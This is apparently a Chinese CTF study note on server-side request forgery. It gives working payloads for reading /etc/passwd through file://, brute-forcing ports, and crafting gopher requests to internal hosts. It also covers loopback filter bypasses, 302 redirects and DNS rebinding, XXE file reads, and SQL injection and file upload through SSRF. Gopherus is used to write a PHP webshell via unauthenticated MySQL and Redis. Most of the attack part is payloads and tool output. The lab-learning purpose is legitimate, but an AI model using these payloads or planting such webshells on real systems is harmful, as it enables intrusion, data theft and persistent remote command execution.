---
title: SSRF
date: 2024-9-16 23:24:25
tags: CTF
categories: CTF-Web
---



# 相关函数和类

file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中
readfile()：输出一个文件的内容
fsockopen()：打开一个网络连接或者一个Unix 套接字连接
curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用
fopen()：打开一个文件文件或者 URL

parse_url():参数是url，解析一个url为数组

```
$url = 'http://username:password@hostname/path?arg=value#anchor';

Array
(
    [scheme] => http
    [host] => hostname
    [user] => username
    [pass] => password
    [path] => /path
    [query] => arg=value
    [fragment] => anchor
)

REQUEST_URI 是path+query部分(不包含fragment)
QUERY_STRING: 主要是key=value部分
HTTP_HOST 是 netloc+port 部分。

```

PHP原生类SoapClient在触发反序列化时可导致SSRF

# 1.SSRF信息收集File伪协议

file:///etc/passwd 读取文件passwd

file:///etc/hosts 显示当前操作系统网卡的IP

file:///proc/net/arp 显示ARP缓存表（寻找内往下其他主机）

可以访问一个ip地址，挨个发送APR请求

file:///proc/net/fib_trie 显示当前网段路由信息

# 2.SSRF信息收集Dict伪协议

dict://167.250.250.$1$:$80$

爆破开启的端口

# 3.SSRF信息收集HTTP伪协议

http://172.250.250.1/$index$.php

爆破存在的页面

4.SSRF利用gopher伪协议学习

**gopher默认不提交第一位，第一位需要加上填充符**

## 1.get提交

![image-20240401151236777](./././././././././SSRF/image-20240401151236777.png)

1.直接提交

构造代码：

```
GET /name.php HTTP/1.1
Host: 172.250.250.4
```

（这里会有个换行）

将头部内容URL编码

gopher://172.250.250.4:80/_GET%20/name.php%3fname=benben%20HTTP/1.1%0d%0AHost:%20172.250.250.4%0d%0A

#### 2.BurpSuite抓包

提交：gopher://172.250.250.4:80/_

BurpSuite抓包：![image-20240401154607421](./././././././././SSRF/image-20240401154607421.png)

把构造的代码粘贴在url后面，做两次URL编码进行提交

![image-20240401164505250](./././././././././SSRF/image-20240401164505250.png)

## 2.post提交

需要保留的头部信息：

```
POST /name.php HTTP/1.1
Host: 172.250.250.4
Content-Type: application/x-www-form-urlencoded
Content-Length: 13

name=jianjian
```

（构造代码）

BurpSuite抓包进行两次URL编码然后上传



# 5.SSRF回环地址的绕过

http://127.0.0.1/flag.php被过滤

将127.0.0.1转换为其他进制

八进制 ：177000000001或点分式：0177.0000.0000.0001

十六进制0x4F000001

十进制2130706433

```
url=http://0/flag.php 
url=http://127.1/flag.php 
url=http://0x7f.0.0.1/flag.php
url=http://0177.0.0.1/flag.php
```

http(s)://sudo.cc

> A记录：A 记录（Address Record）是一种 DNS 记录类型，用于将域名映射到一个 IPv4 地址。通过设置 A 记录，你可以将特定的域名直接指向一个具体的 IP 地址，从而使用户能够通过这个域名访问相应的服务器或网络资源。
>
> http(s)://sudo.cc就是一个A记录为127.0.0.1的

其他绕过127的方法
如果目标代码限制访问的域名只能为 http://www.xxx.com，那么我们可以采用HTTP基本身份认证的方式绕过。即@：http://www.xxx.com@www.evil.com http://www.evil.com/

http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，如访问：http://127.0.0.1.xip.io/flag.php时，实际访问的是http://127.0.0.1/1.php 像这样的网址还有 http://nip.io，http://sslip.io

短网址目前基本都需要登录使用，如缩我，https://4m.cn/

各种指向127.0.0.1的地址

```
http://localhost/         # localhost就是代指127.0.0.1
http://0/                 # 0在window下代表0.0.0.0，而在liunx下代表127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]/    # 在liunx下可用，window测试了下不行
http://[::]:80/           # 在liunx下可用，window测试了下不行
http://127。0。0。1/       # 用中文句号绕过
http://①②⑦.⓪.⓪.①
http://127.1/
http://127.00000.00000.001/ # 0的数量多一点少一点都没影响，最后还是会指向127.0.0.1

```



# 6.SSRF之302重定向绕过

## VPS

对本地地址或者内网地址有过滤

访问公网服务器ip，公网下存在index.php

index.php的内容

```
<?php

header('Location:http://127.0.0.1/flag.php')

?>
```



访问公网下的index.php相当于访问127.0.0.1/flag.php

## 2.sudo.cc

http(s)://sudo.cc

> A记录：A 记录（Address Record）是一种 DNS 记录类型，用于将域名映射到一个 IPv4 地址。通过设置 A 记录，你可以将特定的域名直接指向一个具体的 IP 地址，从而使用户能够通过这个域名访问相应的服务器或网络资源。
>
> http(s)://sudo.cc就是一个A记录为127.0.0.1的

## 3.ceyo.cc

http://ceye.io/profile

![image-20240531162715241](./././././././././SSRF/image-20240531162715241.png)

将127.0.0.1重定向到另一个ip

payload:http://r.my-domain/flag.php

需要多次访问

# 7.SSRF之DNS重绑定绕过

https://lock.cmpxchg8b.com/rebinder.html

TTL最理想的设置为0，在第一次解析之后，立马换成我们想要访问的DNS服务器，有概率成功

http://DNS域名/flag.php

# 8.SSRF进行XXE漏洞利用

### XXE漏洞

```xml
<?xml version = "1.0"?>
<!DOCTYPE note[ <!ENTITY cc "aa"> ]>
<na>&cc;</na>
```

```xml
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY f SYSTEM "file:///C://Windows//win/ini"> ]>
<x>&f;</x>
```

 

```
<?xml version = "1.0"?>
<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///C://Windows//win/ini"> ]>
<user><username>&admin;</username><password> admin</password></user> 
```



### 利用SSRF进行XXE漏洞

使用gopher伪协议

需要注意的是post提交的是哪个页面，有可能不是index.php

```xml
POST /doLogin.php HTTP/1.1
Host: 172.250.250.6
contentType: application/xml;charset=utf-8
Content-Length: 131

<!DOCTYPE ANY[ <!ENTITY admin SYSTEM "file:///etc/passwd"> ]><user><username>&admin;</username><password> admin</password></user> 
```

# 9.SSRF进行SQL注入

使用<font color=Red>--%20</font>>注释

使用hackbar提交时会对已经输入的内容进行一次URL编码,把%20替换成%2520

SSRF需要两次URL编码 

![image-20240407203908192](./././././././././SSRF/image-20240407203908192.png)

### gopher提交

```xml
gopher://172.250.250.11:80/_POST /Less-11/index.php HTTP/1.1
HOST:172.250.250.11
Content-Type:application/x-www-form-urlencoded
Content_Length: 53
Uname=-1' union select 1,2 #&passwd=123&submit=Submit
```

# 10.SSRF进行文件上传漏洞

multipart/from-data 作为分割符分开POST提交

完整payload

```
POST /Pass-01/index.php HTTP/1.1
HOST:172.250.205.14
Content-Type:multipart/form-data;boundary=----xxxxxxxxxxxxx

------xxxxxxxxxxxxx
Content-Disposition: form-data;name="upload_file";filename="phpinfo.php //根据源代码自定义
Content-Type: image/jpeg"

<?php phpinfo()?>
------xxxxxxxxxxxxx
Content-Disposition: form-data; name="submit" //源代码中的name

上传  //源代码中的value
------xxxxxxxxxxxxx--
```

# 11.SSRF进行mysql未授权漏洞

## 1.工具Gopherus  

工具目录：kali /SSRF/Gopherus

| Command            | Description           |
| ------------------ | --------------------- |
| gopherus --help    | Help                  |
| gopherus --exploit | Arguments can be :    |
|                    | --exploit mysql       |
|                    | --exploit postgresql  |
|                    | --exploit fastcgi     |
|                    | --exploit redis       |
|                    | --exploit zabbix      |
|                    | --exploit pymemcache  |
|                    | --exploit rbmemcache  |
|                    | --exploit phpmemcache |
|                    | --exploit dmpmemcache |
|                    | --exploit smtp        |

# 12.SSRF进行mysql未授权文件写入

查看是否有写入权限，查看secure_file_priv函数

```
 python2 gopherus.py --exploit mysql  


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: show variables like '%secure%'
```

写入一句话木马

```
python2 gopherus.py --exploit mysql


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$

For making it work username should not be password protected!!!

Give MySQL username: root
Give query to execute: select "<?php system($_GET['cmd']);?>" into outfile '/var/www/html/cmd.php';
```

# 13.SSRF对redis未授权webshell写入

默认端口：6379

```
python2 gopherus.py --exploit redis


  ________              .__
 /  _____/  ____ ______ |  |__   ___________ __ __  ______
/   \  ___ /  _ \\____ \|  |  \_/ __ \_  __ \  |  \/  ___/
\    \_\  (  <_> )  |_> >   Y  \  ___/|  | \/  |  /\___ \
 \______  /\____/|   __/|___|  /\___  >__|  |____//____  >
        \/       |__|        \/     \/                 \/

                author: $_SpyD3r_$


Ready To get SHELL

What do you want?? (ReverseShell/PHPShell): PHPShell

Give web root location of server (default is /var/www/html): /var/www/html
Give PHP Payload (We have default PHP Shell): 
```

